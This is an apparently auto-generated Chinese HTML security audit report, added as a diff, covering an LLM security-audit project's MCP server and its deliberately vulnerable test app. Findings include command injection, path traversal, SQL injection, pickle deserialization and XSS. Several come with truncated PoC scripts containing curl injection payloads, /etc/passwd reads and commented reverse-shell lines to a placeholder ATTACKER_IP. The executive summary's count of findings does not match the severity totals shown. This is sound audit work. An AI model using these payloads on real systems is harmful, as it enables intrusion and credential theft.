@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>CodeSentinel 安全审计报告 - llm-security-audit</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 40px; background: #f5f5f5; }
+        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #1a1a2e; border-bottom: 3px solid #e94560; padding-bottom: 10px; }
+        h2 { color: #16213e; margin-top: 30px; }
+        .summary-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin: 20px 0; }
+        .summary-card { padding: 20px; border-radius: 8px; text-align: center; color: white; }
+        .summary-card h3 { margin: 0; font-size: 2em; }
+        .summary-card p { margin: 5px 0 0; }
+        .vuln-card { background: #f8f9fa; padding: 20px; margin: 15px 0; border-radius: 5px; }
+        pre { background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; }
+        details { margin-top: 10px; }
+        summary { cursor: pointer; color: #e94560; font-weight: bold; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>CodeSentinel 安全审计报告</h1>
+    <p><strong>项目:</strong> llm-security-audit | <strong>语言:</strong> {"Python": 100.0} | <strong>时间:</strong> 2026-07-08 22:08:31</p>
+
+    <h2>执行摘要</h2>
+    <p>本次安全审计针对项目 'llm-security-audit' (Python 代码库，共 16 个文件，5140 行代码) 进行。审计发现 5 个高危及以上漏洞，包括 1 个严重级别的命令注入漏洞和 4 个高严重级别的路径遍历漏洞。这些漏洞均位于 MCP 服务器核心模块 `src/agents/mcp_server.py` 中，由于对用户输入的 `path` 参数缺乏充分的验证和清理，攻击者可以执行任意系统命令或读取服务器上的任意文件，可能导致服务器完全沦陷、敏感数据泄露以及横向移动攻击。建议立即修复所有已确认的漏洞。</p>
+    <p><strong>风险评分:</strong> 92/100</p>
+
+    <div class="summary-grid">
+        <div class="summary-card" style="background:#dc3545;"><h3>6</h3><p>严重</p></div>
+        <div class="summary-card" style="background:#fd7e14;"><h3>9</h3><p>高危</p></div>
+        <div class="summary-card" style="background:#ffc107;color:#333;"><h3>3</h3><p>中危</p></div>
+        <div class="summary-card" style="background:#28a745;"><h3>0</h3><p>低危</p></div>
+    </div>
+
+    <h2>漏洞详情</h2>
+    
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-FC9BB031 - 命令注入</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> src/agents/mcp_server.py:155</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>target = params.get(&quot;path&quot;, self.project_path)
+try:
+    result = subprocess.run(
+        [&quot;trufflehog&quot;, &quot;filesystem&quot;, &quot;--json&quot;, target],
+        capture_output=True, text=True, timeout=120
+    )</code></pre>
+                <p><strong>数据流:</strong> 用户通过params参数传入path -&gt; params.get(&#x27;path&#x27;)获取target -&gt; subprocess.run直接使用target作为命令行参数 -&gt; 命令执行</p>
+                <p><strong>判断理由:</strong> 与bandit扫描类似，trufflehog扫描同样直接将用户输入的path参数传递给subprocess.run。攻击者可以构造恶意路径参数来影响命令执行行为，例如通过路径遍历或特殊字符绕过安全检查。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者在MCP服务器上执行任意系统命令，危害等级为严重。攻击者可以：1) 读取服务器上的任意文件（如/etc/passwd、数据库配置等）；2) 执行系统命令获取服务器控制权；3) 建立反向shell实现持久化控制；4) 横向移动攻击内网其他系统；5) 删除或篡改服务器上的文件。由于MCP服务器通常运行在开发环境或CI/CD流水线中，可能具有较高的权限和敏感数据访问能力，因此该漏洞可能导致整个开发基础设施被攻陷。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC - 命令注入漏洞利用 (仅供研究使用)
+漏洞ID: VULN-FC9BB031
+目标: src/agents/mcp_server.py 中的 _tool_trufflehog_scan 方法
+&quot;&quot;&quot;
+
+import json
+import requests
+
+# 假设MCP服务器运行在本地8000端口
+MCP_SERVER_URL = &quot;http://localhost:8000/mcp&quot;
+
+def exploit_command_injection():
+    &quot;&quot;&quot;
+    利用命令注入漏洞执行任意命令
+    
+    漏洞原理：
+    _tool_trufflehog_scan 方法中，用户传入的 path 参数直接传递给 subprocess.run
+    作为命令行参数，没有经过任何过滤或转义。攻击者可以通过构造特殊字符
+    (如 ;, |, `, $() 等) 注入额外命令。
+    &qu</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-6481DAF7 - 路径遍历</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src/agents/mcp_server.py:178</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>for root, _, files in os.walk(target):
+    for f in files:
+        if f.endswith(file_ext):
+            fpath = os.path.join(root, f)
+            try:
+                with open(fpath, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) as fp:</code></pre>
+                <p><strong>数据流:</strong> 用户通过params传入path -&gt; os.walk(target)遍历目录 -&gt; 读取文件内容 -&gt; 返回匹配结果</p>
+                <p><strong>判断理由:</strong> target参数直接来自用户输入，未经过路径规范化或白名单校验。攻击者可以通过传入&#x27;../&#x27;等路径遍历序列访问项目目录之外的文件系统，导致敏感信息泄露。os.walk会递归遍历所有子目录，扩大了攻击面。</p>
+                <p><strong>影响分析:</strong> 严重信息泄露漏洞。攻击者可以读取服务器文件系统上的任意文件，包括：系统配置文件(/etc/passwd, /etc/shadow)、应用配置文件(数据库密码、API密钥)、源代码文件、SSH私钥等敏感凭证。由于os.walk会递归遍历目录，攻击者可以一次性获取整个目录树的所有文件内容。结合其他漏洞可能导致服务器完全沦陷。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC - 路径遍历漏洞利用 (VULN-6481DAF7)
+仅供安全研究使用，请勿用于非法用途
+&quot;&quot;&quot;
+
+import requests
+import json
+import sys
+
+# 目标服务器配置
+TARGET_URL = &quot;http://localhost:8080&quot;  # 请替换为实际目标地址
+
+# 漏洞利用函数
+def exploit_path_traversal(target_url, traversal_path):
+    &quot;&quot;&quot;
+    利用路径遍历漏洞读取任意文件
+    
+    Args:
+        target_url: MCP服务器地址
+        traversal_path: 遍历路径，如 &#x27;../../../etc/passwd&#x27;
+    &quot;&quot;&quot;
+    # 构造恶意请求
+    payload = {
+        &qu</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-7EC29975 - 路径遍历</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src/agents/mcp_server.py:130</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>target = params.get(&quot;path&quot;, self.project_path)
+try:
+    result = subprocess.run(
+        [&quot;bandit&quot;, &quot;-r&quot;, target, &quot;-f&quot;, &quot;json&quot;],
+        capture_output=True, text=True, timeout=120
+    )</code></pre>
+                <p><strong>数据流:</strong> 用户通过params传入path -&gt; params.get(&#x27;path&#x27;)获取target -&gt; bandit -r target扫描目录 -&gt; 返回扫描结果</p>
+                <p><strong>判断理由:</strong> bandit扫描工具会递归扫描目标目录下的所有文件。攻击者可以通过传入&#x27;../../etc&#x27;等路径遍历参数，使bandit扫描系统敏感目录，并将扫描结果返回给攻击者，导致系统配置信息泄露。</p>
+                <p><strong>影响分析:</strong> 攻击者可以通过路径遍历漏洞扫描系统任意目录，获取敏感文件信息。具体影响包括：1) 系统配置文件泄露(如/etc/passwd, /etc/shadow等)；2) 日志文件泄露(如/var/log/auth.log等)；3) 密钥文件泄露(如SSH私钥、SSL证书等)；4) 源代码泄露(如果项目部署在可访问目录)；5) 数据库配置文件泄露(如数据库密码、连接字符串等)。这些信息可被用于进一步的攻击，如权限提升、横向移动等。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC - 路径遍历漏洞利用 (仅供研究使用)
+漏洞ID: VULN-7EC29975
+目标: MCP Server _tool_bandit_scan 方法
+&quot;&quot;&quot;
+
+import json
+import requests
+
+# ============================================================
+# 配置
+# ============================================================
+MCP_SERVER_URL = &quot;http://localhost:8080/mcp&quot;  # MCP服务器地址
+
+# ============================================================
+# PoC 1: 基础路径遍历 - 扫描 /etc 目录
+# ====================================</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-EE9E72B8 - 路径遍历</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src/agents/mcp_server.py:155</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>target = params.get(&quot;path&quot;, self.project_path)
+try:
+    result = subprocess.run(
+        [&quot;trufflehog&quot;, &quot;filesystem&quot;, &quot;--json&quot;, target],
+        capture_output=True, text=True, timeout=120
+    )</code></pre>
+                <p><strong>数据流:</strong> 用户通过params传入path -&gt; params.get(&#x27;path&#x27;)获取target -&gt; trufflehog filesystem --json target扫描目录 -&gt; 返回扫描结果</p>
+                <p><strong>判断理由:</strong> trufflehog用于扫描硬编码密钥，攻击者可以通过路径遍历参数扫描系统敏感目录（如/etc/shadow、/root/.ssh等），获取系统密钥和凭证信息。</p>
+                <p><strong>影响分析:</strong> 攻击者可以通过路径遍历漏洞，利用 trufflehog 扫描任意系统目录，导致以下严重后果：
+1. 系统凭证泄露：扫描 /etc 目录可能获取系统配置文件中的数据库密码、API 密钥等
+2. SSH 私钥泄露：扫描 /root/.ssh 或 ~/.ssh 目录可获取 SSH 私钥，导致服务器被远程登录
+3. 云服务凭证泄露：扫描 ~/.aws、~/.gcloud、~/.azure 等目录可获取云服务访问密钥
+4. Git 历史泄露：扫描 .git 目录可获取代码仓库历史中的所有密钥
+5. Docker 凭证泄露：扫描 ~/.docker 目录可获取容器仓库认证信息
+6. 数据库凭证泄露：扫描应用程序配置文件可获取数据库连接字符串和密码
+7. 横向移动：获取的凭证可用于攻击内部其他系统</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC - 路径遍历漏洞利用 (仅供安全研究使用)
+漏洞ID: VULN-EE9E72B8
+目标: MCP Server _tool_trufflehog_scan 方法
+&quot;&quot;&quot;
+
+import json
+import requests
+
+# ============================================================
+# PoC 1: 通过 MCP JSON-RPC 协议直接调用 (标准利用方式)
+# ============================================================
+
+def poc_mcp_rpc_exploit(target_url: str, scan_path: str) -&gt; dict:
+    &quot;&quot;&quot;
+    通过 MCP JSON-RPC 调用 scan_secrets 工具，传入恶意路径
+    
+    Args:
+  </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-B085A0BA - 不安全的文件读取</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> src/agents/mcp_server.py:178</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>with open(fpath, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) as fp:
+    for i, line in enumerate(fp, 1):
+        if re.search(pattern, line):
+            findings.append({
+                &quot;file&quot;: os.path.relpath(fpath, target),
+                &quot;line&quot;: i,
+                &quot;match&quot;: line.strip()[:200],
+            })</code></pre>
+                <p><strong>数据流:</strong> 用户传入pattern和path -&gt; 遍历目录 -&gt; 打开文件 -&gt; 正则匹配 -&gt; 返回匹配内容</p>
+                <p><strong>判断理由:</strong> 该函数不仅允许路径遍历，还会将匹配到的文件内容（最多200字符）返回给调用者。攻击者可以通过构造特定的正则表达式来提取敏感信息，如密码、密钥、配置信息等。同时，正则表达式本身也可能导致ReDoS攻击（如果pattern来自用户输入）。</p>
+                <p><strong>影响分析:</strong> 攻击者可以通过路径遍历读取任意文件内容（最多200字符），结合正则匹配可提取密码、密钥、配置信息等敏感数据。同时，恶意正则表达式可导致ReDoS攻击，造成服务拒绝服务。该漏洞影响所有调用scan_pattern工具的LLM Agent会话，可能导致敏感信息泄露和系统可用性受损。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-B085A0BA - 不安全的文件读取漏洞
+仅供安全研究使用，请勿用于非法用途
+&quot;&quot;&quot;
+import requests
+import json
+
+# 假设MCP Server运行在本地8000端口，通过JSON-RPC调用
+target_url = &quot;http://localhost:8000/mcp/call&quot;
+
+# 利用1: 路径遍历 + 敏感信息提取
+# 读取 /etc/passwd 文件中的用户名信息
+payload1 = {
+    &quot;tool_name&quot;: &quot;scan_pattern&quot;,
+    &quot;params&quot;: {
+        &quot;path&quot;: &quot;../../etc&quot;,  # 路径遍历，从项目目录跳转到/etc
+        &quot;pattern&quot;: &quot;^[a-zA-Z0-9_]+:x</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-BCD62A62 - 硬编码凭证</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src\analyzers\graph_builder.py:37</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>self.driver = GraphDatabase.driver(
+                config[&quot;uri&quot;],
+                auth=(config[&quot;user&quot;], config[&quot;password&quot;])
+            )</code></pre>
+                <p><strong>数据流:</strong> 从config.settings.NEO4J_CONFIG读取凭证，但凭证可能以明文形式存储在配置文件中</p>
+                <p><strong>判断理由:</strong> Neo4j数据库的用户名和密码直接从配置文件中读取并以明文形式传递给数据库驱动。如果配置文件被泄露或存储在版本控制中，会导致数据库凭证泄露。建议使用环境变量或密钥管理服务存储敏感凭证。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致Neo4j数据库凭证泄露。攻击者可完全控制Neo4j数据库，访问所有存储的漏洞知识图谱数据，包括项目信息、文件路径、漏洞详情、CVE关联等敏感数据。更严重的是，攻击者可能通过Neo4j的存储过程或文件操作功能实现远程代码执行，或利用数据库作为跳板攻击内部网络。此外，凭证泄露还可能导致其他使用相同凭证的系统被攻破。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC - 硬编码凭证泄露利用
+漏洞ID: VULN-BCD62A62
+仅供安全研究使用
+&quot;&quot;&quot;
+
+import requests
+import json
+import sys
+
+# ========== 配置区域 ==========
+TARGET_URL = &quot;http://target-app:8080&quot;  # 目标应用地址
+CONFIG_PATH = &quot;/config/settings.py&quot;    # 配置文件路径（可能通过路径遍历访问）
+# ==============================
+
+def check_path_traversal():
+    &quot;&quot;&quot;
+    尝试通过路径遍历读取配置文件
+    利用方式：目录遍历/SSRF/任意文件读取
+    &quot;&quot;&quot;
+    print(&quot;[*] 尝试通过路径遍历读取配置文件...&quot;</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-DF772B9D - 不安全的错误信息泄露</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> src\analyzers\llm_api.py:155</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>return {&quot;error&quot;: f&quot;API Error {resp.status_code}: {resp.text[:200]}&quot;}</code></pre>
+                <p><strong>数据流:</strong> API 响应内容（resp.text）被截取前200个字符后直接返回给调用者。如果 API 返回了包含敏感信息的错误消息（如 API Key 泄露、内部路径等），这些信息会被泄露。</p>
+                <p><strong>判断理由:</strong> 在错误处理中，直接将 API 返回的原始响应文本（resp.text）截取后返回。如果 LLM API 返回的错误信息中包含敏感数据（如认证信息、内部配置等），这些信息会通过错误消息泄露给上层调用者。</p>
+                <p><strong>影响分析:</strong> 攻击者可以通过构造特定请求触发 LLM API 返回包含敏感信息的错误消息，从而获取以下信息：
+1. API Key 或认证令牌（部分泄露）
+2. 内部服务标识和配置信息
+3. 调试信息和堆栈跟踪
+4. 内部网络路径和文件路径
+5. API 配额和使用限制信息
+6. 其他可能被用于进一步攻击的敏感数据
+
+这些信息可能被用于：
+- 绕过认证机制
+- 获取 API 访问权限
+- 了解内部系统架构
+- 进行更精准的后续攻击</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-DF772B9D - 不安全的错误信息泄露
+仅供安全研究使用
+&quot;&quot;&quot;
+
+import requests
+import sys
+
+# 配置目标 API 端点（假设本地测试环境）
+TARGET_URL = &quot;http://localhost:8080/api/analyze&quot;  # 替换为实际目标
+
+# 构造恶意请求，触发 API 返回包含敏感信息的错误
+# 例如：使用无效的 API Key 或格式错误的请求
+
+def exploit_error_leakage(target_url):
+    &quot;&quot;&quot;
+    利用不安全的错误信息泄露漏洞
+    通过构造特定请求触发 LLM API 返回包含敏感信息的错误响应
+    &quot;&quot;&quot;
+    print(&quot;[*] 开始漏洞利用测试...&quot;)
+    print(&quot;[*] 仅供安全研究使用&quot;</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-3CB16730 - SQL注入</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> tests\vulnerable_app.py:29</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>query = f&quot;SELECT * FROM users WHERE id = &#x27;{user_id}&#x27;&quot;
+cursor.execute(query)</code></pre>
+                <p><strong>数据流:</strong> 用户输入通过request.args.get(&#x27;id&#x27;)获取，直接通过f-string拼接进SQL查询字符串，然后传递给cursor.execute()执行</p>
+                <p><strong>判断理由:</strong> 用户可控的user_id参数未经任何过滤或参数化处理，直接拼接进SQL语句。攻击者可构造恶意输入如&#x27; OR &#x27;1&#x27;=&#x27;1绕过认证或执行任意SQL命令</p>
+                <p><strong>影响分析:</strong> 攻击者可以通过SQL注入漏洞完全控制数据库，包括：1) 绕过认证获取所有用户数据；2) 提取数据库结构(表名、列名)；3) 读取任意表数据；4) 在SQLite环境下，可能通过ATTACH DATABASE写入文件；5) 结合其他漏洞(如命令注入)可实现远程代码执行。该漏洞影响所有使用该路由的用户，CVSS评分预计为9.8(Critical)。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+SQL注入漏洞PoC - 仅供安全研究使用
+目标: tests/vulnerable_app.py 中的 /user 路由
+&quot;&quot;&quot;
+
+import requests
+import sys
+
+# 配置目标URL
+TARGET_BASE = &quot;http://localhost:8080&quot;
+
+def poc_basic_auth_bypass():
+    &quot;&quot;&quot;
+    PoC 1: 基础认证绕过
+    利用 &#x27; OR &#x27;1&#x27;=&#x27;1 绕过WHERE条件，返回所有用户
+    &quot;&quot;&quot;
+    print(&quot;[*] PoC 1: 基础认证绕过 - 获取所有用户&quot;)
+    payload = &quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot;
+    url = f&quot;{TARGET_BASE}/u</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-1A20623A - SQL注入</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> tests\vulnerable_app.py:41</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>cursor.execute(f&quot;SELECT * FROM users WHERE name LIKE &#x27;%{keyword}%&#x27;&quot;)</code></pre>
+                <p><strong>数据流:</strong> 用户输入通过request.args.get(&#x27;q&#x27;)获取，直接通过f-string拼接进SQL LIKE查询，然后传递给cursor.execute()执行</p>
+                <p><strong>判断理由:</strong> 与第29行类似，keyword参数直接拼接进SQL语句。LIKE子句中的注入同样危险，攻击者可利用通配符和SQL语法进行注入攻击</p>
+                <p><strong>影响分析:</strong> 该SQL注入漏洞允许攻击者完全绕过身份验证，获取数据库中所有用户数据。通过LIKE子句注入，攻击者可以：1) 使用OR 1=1获取所有用户记录；2) 使用UNION查询获取数据库版本、表结构等敏感信息；3) 通过布尔盲注或时间盲注逐字符提取数据；4) 利用LIKE通配符进行模糊匹配和信息泄露。在真实环境中，攻击者可能进一步利用此漏洞获取管理员凭证、修改数据或执行更高级的数据库操作。由于该漏洞位于/search路由，且用户输入直接拼接进SQL查询，攻击者无需特殊权限即可利用。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+SQL注入漏洞PoC - 仅供安全研究使用
+漏洞位置: tests/vulnerable_app.py 第41行
+漏洞类型: SQL注入 (LIKE子句注入)
+&quot;&quot;&quot;
+
+import requests
+import urllib.parse
+
+# 目标URL (假设应用运行在本地8080端口)
+BASE_URL = &quot;http://localhost:8080&quot;
+
+print(&quot;=&quot; * 60)
+print(&quot;SQL注入漏洞PoC - 仅供安全研究使用&quot;)
+print(&quot;漏洞ID: VULN-1A20623A&quot;)
+print(&quot;=&quot; * 60)
+
+# ============================================
+# PoC 1: 基础注入 - 获取所有用户
+# ============================================</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-1E34FEE3 - 命令注入</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> tests\vulnerable_app.py:53</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>result = os.system(f&quot;ping -c 3 {host}&quot;)</code></pre>
+                <p><strong>数据流:</strong> 用户输入通过request.args.get(&#x27;host&#x27;)获取，直接通过f-string拼接进系统命令字符串，然后传递给os.system()执行</p>
+                <p><strong>判断理由:</strong> os.system()会启动shell执行命令，host参数完全由用户控制。攻击者可输入如&#x27;127.0.0.1; rm -rf /&#x27;执行任意系统命令</p>
+                <p><strong>影响分析:</strong> 攻击者可以完全控制目标服务器，执行任意系统命令。可能导致：服务器被完全控制、敏感数据泄露、横向移动、持久化后门植入、拒绝服务攻击等。由于os.system()在shell中执行命令，攻击者可以执行任何shell支持的操作，包括文件读写、进程管理、网络连接等。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - 命令注入漏洞PoC
+# 目标: tests/vulnerable_app.py 中的 /ping 端点
+
+TARGET=&quot;http://localhost:8080&quot;
+
+# PoC 1: 基础命令注入 - 执行id命令
+curl &quot;${TARGET}/ping?host=127.0.0.1;id&quot;
+
+# PoC 2: 读取敏感文件
+curl &quot;${TARGET}/ping?host=127.0.0.1;cat%20/etc/passwd&quot;
+
+# PoC 3: 创建测试文件（无害）
+curl &quot;${TARGET}/ping?host=127.0.0.1;echo%20&#x27;POC_TEST&#x27;&gt;/tmp/poc_test.txt&quot;
+
+# PoC 4: 反向shell（仅演示，不实际执行）
+# curl &quot;${TARGET}/ping?host=127.0.0.1;bash%20-i%20&gt;&amp;%20/dev/tcp/ATT</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-5AF56E87 - 命令注入</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> tests\vulnerable_app.py:62</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>output = subprocess.check_output(cmd, shell=True)</code></pre>
+                <p><strong>数据流:</strong> 用户输入通过request.args.get(&#x27;cmd&#x27;)获取，直接传递给subprocess.check_output()且shell=True</p>
+                <p><strong>判断理由:</strong> shell=True会通过shell执行命令，cmd参数完全由用户控制。攻击者可输入任意系统命令，如&#x27;ls; cat /etc/passwd&#x27;</p>
+                <p><strong>影响分析:</strong> 攻击者可以完全控制目标服务器，执行任意系统命令。具体危害包括：1) 读取任意敏感文件（如/etc/passwd、数据库配置等）；2) 获取系统权限和用户信息；3) 安装后门或恶意软件；4) 横向移动攻击内网其他系统；5) 完全控制服务器导致数据泄露或服务瘫痪。由于该漏洞为critical级别，且利用难度低（仅需HTTP请求），实际部署时会造成灾难性后果。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - 命令注入漏洞PoC
+# 目标: 利用/exec端点的命令注入漏洞
+
+# 基础命令执行测试
+curl &quot;http://localhost:8080/exec?cmd=id&quot;
+
+# 读取敏感文件
+curl &quot;http://localhost:8080/exec?cmd=cat%20/etc/passwd&quot;
+
+# 获取系统信息
+curl &quot;http://localhost:8080/exec?cmd=uname%20-a&quot;
+
+# 反弹shell (需要攻击者监听端口)
+# curl &quot;http://localhost:8080/exec?cmd=bash%20-c%20&#x27;bash%20-i%20&gt;%26%20/dev/tcp/ATTACKER_IP/4444%200&gt;%261&#x27;&quot;
+
+# 写入webshell
+# curl &quot;http://localhost:8080/exec?cmd=echo%20&#x27;&lt;?php</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-F0892980 - 路径遍历</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> tests\vulnerable_app.py:72</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>filepath = os.path.join(&quot;data&quot;, filename)
+with open(filepath, &quot;r&quot;) as f:</code></pre>
+                <p><strong>数据流:</strong> 用户输入通过request.args.get(&#x27;file&#x27;)获取，与&#x27;data&#x27;目录拼接后直接用于打开文件</p>
+                <p><strong>判断理由:</strong> 虽然使用了os.path.join，但filename参数未做任何路径校验。攻击者可输入&#x27;../etc/passwd&#x27;绕过目录限制读取任意文件</p>
+                <p><strong>影响分析:</strong> 成功利用此路径遍历漏洞可导致：1) 读取服务器任意文件，包括系统配置文件(/etc/passwd, /etc/shadow)、应用源码、数据库文件、密钥文件等敏感信息；2) 获取应用逻辑和内部结构信息，为进一步攻击提供基础；3) 在特定场景下，结合其他漏洞（如文件包含、SSRF）可能导致远程代码执行；4) 泄露硬编码在源码中的凭证（如AWS密钥、API密钥等），造成更严重的安全事件。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+路径遍历漏洞 PoC - 仅供安全研究使用
+目标: tests/vulnerable_app.py 中的 /read 端点
+&quot;&quot;&quot;
+
+import requests
+import urllib.parse
+
+# 目标应用地址（假设运行在本地8080端口）
+BASE_URL = &quot;http://127.0.0.1:8080&quot;
+
+print(&quot;=&quot; * 60)
+print(&quot;路径遍历漏洞 PoC - 仅供安全研究使用&quot;)
+print(&quot;=&quot; * 60)
+
+# PoC 1: 读取 /etc/passwd (Linux)
+print(&quot;\n[PoC 1] 读取 /etc/passwd:&quot;)
+try:
+    payload = &quot;../../../etc/passwd&quot;
+    url = f&quot;{BASE_URL}/read?file={urllib.p</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #dc3545;">
+                <h3>VULN-7CD2ECC6 - 不安全的反序列化</h3>
+                <span class="severity" style="background:#dc3545;color:white;padding:2px 8px;border-radius:3px;">CRITICAL</span>
+                <p><strong>文件:</strong> tests\vulnerable_app.py:101</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>obj = pickle.loads(bytes.fromhex(data))</code></pre>
+                <p><strong>数据流:</strong> 用户输入通过request.args.get(&#x27;data&#x27;)获取，从十六进制解码后直接传递给pickle.loads()反序列化</p>
+                <p><strong>判断理由:</strong> pickle反序列化不可信数据可导致任意代码执行。攻击者可构造恶意的pickle数据，在反序列化时执行任意Python代码</p>
+                <p><strong>影响分析:</strong> 攻击者可以通过精心构造的pickle数据实现远程代码执行(RCE)，完全控制目标服务器。具体影响包括：1) 执行任意系统命令；2) 读取、修改或删除任意文件；3) 安装后门或恶意软件；4) 横向移动至内网其他系统；5) 窃取敏感数据（数据库凭证、密钥等）。由于该漏洞评分critical且利用复杂度低，攻击者只需发送一个HTTP GET请求即可完成利用，危害极大。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC: 不安全的反序列化漏洞利用
+漏洞ID: VULN-7CD2ECC6
+目标: tests/vulnerable_app.py 第101行
+漏洞类型: CWE-502 不安全的反序列化
+
+⚠️ 仅供安全研究使用 ⚠️
+&quot;&quot;&quot;
+
+import pickle
+import os
+import requests
+import sys
+
+# ============================================================
+# 步骤1: 构造恶意pickle负载
+# ============================================================
+
+def create_malicious_payload(command):
+    &quot;&quot;&quot;
+    创建一个在反序列化时执行指定系统命令的恶意pickle对象
+    
+    原理: 通过定义 __reduce__ 方法，</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-B0030498 - 跨站脚本(XSS)</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> tests\vulnerable_app.py:112</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>html = f&quot;&lt;h1&gt;Hello, {name}!&lt;/h1&gt;&quot;
+return render_template_string(html)</code></pre>
+                <p><strong>数据流:</strong> 用户输入通过request.args.get(&#x27;name&#x27;)获取，直接拼接进HTML模板字符串，然后通过render_template_string渲染</p>
+                <p><strong>判断理由:</strong> 用户输入未经任何HTML转义直接嵌入到模板中。攻击者可注入&lt;script&gt;标签执行任意JavaScript代码，导致XSS攻击</p>
